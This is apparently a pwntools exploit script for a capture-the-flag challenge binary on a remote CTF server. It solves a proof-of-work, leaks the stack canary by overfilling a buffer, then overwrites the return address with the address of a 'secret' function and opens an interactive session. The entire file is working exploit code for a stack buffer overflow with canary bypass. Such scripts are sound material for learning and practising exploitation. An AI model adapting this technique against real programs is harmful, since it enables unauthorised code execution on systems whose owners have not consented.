from pwn import *
import subprocess

elf = ELF('./chal')
p = remote('kctf.rozdzka.securing.pl', 30003)
# p = process(elf.path)
# p = gdb.debug(elf.path, '''
# b *guard+211
# c
# ''')

data = p.recvuntil("pow) solve ")
data = p.recvline().decode().strip()
print(' '.join(['python', 'pow.py', 'solve', data]))
res = subprocess.check_output(['python3', 'pow.py', 'solve', data])
p.sendline(res)
print(p.clean())

payload = b"LaLaLaiAAAAAAAAA"
p.sendline(payload)
print(p.recvline())

leak = p.recvuntil('*Magiczny')
print(leak)

to_find = b'LaLaLaiAA'
start = leak.index(to_find) + len(to_find)
cookie = b'\x00' + leak[start:start+7]
cookie = u64(cookie)
print("Cookie:", hex(cookie))

payload = b'A' * 8
payload += p64(cookie)
payload += b'B' * 8
payload += p64(elf.symbols['secret'])
p.sendline(payload)

p.interactive()
